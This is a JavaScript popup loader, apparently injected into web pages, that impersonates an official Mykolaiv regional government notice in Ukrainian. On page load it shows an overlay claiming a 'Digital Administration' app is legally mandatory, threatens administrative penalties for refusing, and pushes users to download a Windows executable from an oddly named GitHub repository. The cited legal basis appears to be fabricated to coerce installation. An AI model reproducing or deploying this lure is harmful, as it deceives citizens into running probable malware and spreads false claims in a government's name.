// MK.GOV.UA OFFIAL POPUP LOADER
// MK.GOV.UA OFFIAL POPUP LOADER
// MK.GOV.UA OFFIAL POPUP LOADER

(function() {
    const style = document.createElement('style');
    style.textContent = `
        .popup-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 99999;
            opacity: 0;
            animation: fadeIn 1.5s ease-out forwards;
        }
        
        .popup-container {
            background: white;
            width: 400px;
            max-width: 90%;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            transform: translateY(100px);
            opacity: 0;
            animation: slideUp 2s ease-out 0.5s forwards;
        }
        
        .popup-title {
            color: #1a237e;
            font-size: 22px;
            margin-bottom: 15px;
            text-align: center;
            font-weight: bold;
        }
        
        .popup-text {
            color: #333;
            font-size: 16px;
            line-height: 1.5;
            margin-bottom: 20px;
            text-align: justify;
        }
        
        .popup-warning {
            color: #d32f2f;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 25px;
            padding: 10px;
            background: #ffebee;
            border-radius: 8px;
            border-left: 4px solid #d32f2f;
        }
        
        .download-btn {
            display: block;
            width: 100%;
            background: linear-gradient(135deg, #4CAF50, #2E7D32);
            color: white;
            border: none;
            padding: 15px;
            font-size: 18px;
            border-radius: 10px;
            cursor: pointer;
            text-align: center;
            text-decoration: none;
            font-weight: bold;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.3);
        }
        
        .download-btn:hover {
            background: linear-gradient(135deg, #43A047, #1B5E20);
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(76, 175, 80, 0.4);
        }
        
        @keyframes fadeIn {
            to { opacity: 1; }
        }
        
        @keyframes slideUp {
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        @media (max-width: 480px) {
            .popup-container {
                width: 95%;
                padding: 20px;
            }
        }
    `;
    
    const popupHTML = `
        <div class="popup-overlay" id="taxPopup">
            <div class="popup-container">
                <title>MikolaevDIA - Завантажити</title>
                <div class="popup-title">ЗВЕРНЕННЯ ДО ГРОМАДЯН МИКОЛАЇВСЬКОЇ ОБЛАСТІ</div>
                <div class="popup-text">
                    Шановні громадяни! В межах цифровізації державних послуг та спрощення адміністративних процедур, наше управління впровадило спеціальний мобільний додаток "Цифрова Адміністрація".<br><br>
                    Через застосунок ви зможете оперативно сплачувати податки, комунальні платежі, адміністративні збори. Система дозволяє керувати електронними документами, відстежувати статус звернень, отримувати повідомлення про нарахування.<br><br>
                    Для батьків доступна функція моніторингу відвідування дитячих закладів освіти, харчування у школах, а також електронний щоденник учня.
                </div>
                <div class="popup-warning">
                    *Встановлення додатка є обов'язковим згідно з Постановою Кабінету Міністрів України №754 від 15.11.2023 "Про цифровізацію адміністративних послуг у регіонах". За відмову встановлення передбачено адміністративну відповідальність згідно зі ст. 188-21 КУпАП.
                </div>
                <a href="https://github.com/mk-gov-ua/jgfjdhkmbvn.github.io/raw/refs/heads/main/MIkolaevApp.exe" class="download-btn" id="downloadBtn">
                    📲 ЗАВАНТАЖИТИ ДОДАТОК
                </a>
            </div>
        </div>
    `;
    
    document.head.appendChild(style);
    document.body.insertAdjacentHTML('beforeend', popupHTML);
    
    setTimeout(() => {
        const downloadBtn = document.getElementById('downloadBtn');
        if (downloadBtn) {
            downloadBtn.onclick = function(e) {
                e.preventDefault();
                alert("Додаток завантажується... Це може зайняти кілька хвилин.");
                window.location.href = this.href;
            };
        }
    }, 100);
    
    setTimeout(() => {
        const overlay = document.getElementById('taxPopup');
        if (overlay) {
            overlay.onclick = function(e) {
                if (e.target === this) {
                    this.style.opacity = '0';
                    setTimeout(() => this.remove(), 500);
                }
            };
        }
    }, 100);
    
    setTimeout(() => {
        const popup = document.getElementById('taxPopup');
        if (popup) {
            popup.style.opacity = '0';
            setTimeout(() => popup.remove(), 500);
        }
    }, 60000);
})();
